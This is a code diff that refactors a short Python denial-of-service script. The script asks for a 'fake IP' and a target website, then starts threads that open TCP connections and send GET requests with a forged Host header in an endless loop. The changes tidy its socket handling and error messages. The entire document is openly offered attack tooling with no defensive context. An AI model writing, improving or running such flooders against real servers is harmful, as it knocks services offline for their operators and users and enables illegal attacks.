@@ -1,5 +1,6 @@
 from socket import socket, AF_INET, SOCK_STREAM
 from threading import Thread
+from sys import exit
 
 fake_ip = input("Fake IP address: ")
 target = input("Target website: ")
@@ -10,18 +11,22 @@ get = ("GET /" + target + " HTTP/1.1\r\n").encode('ascii')
 host = ("Host: " + fake_ip + "\r\n\r\n").encode('ascii')
 target_port = (target, port)
 
+
 def attack(count):
     while True:
         try:
-            s = socket(AF_INET, SOCK_STREAM)
-            s.connect(target_port)
-            s.sendto(get,target_port)
-            s.sendto(host,target_port)
-            s.close()
+            with socket(AF_INET, SOCK_STREAM) as s:
+                s.connect(target_port)
+                s.sendto(get, target_port)
+                s.sendto(host, target_port)
+                s.close()
             print("Successfull: " + count)
-        except Exception as e:
-            print("Server Error: " + count)
-            print("Error: " + e)
+        except ConnectionRefusedError:
+            print("404 / 500...")
+        except KeyboardInterrupt:
+            exit()
+        except Exception:
+            print("Error")
 
 
 for i in range(attack_count):
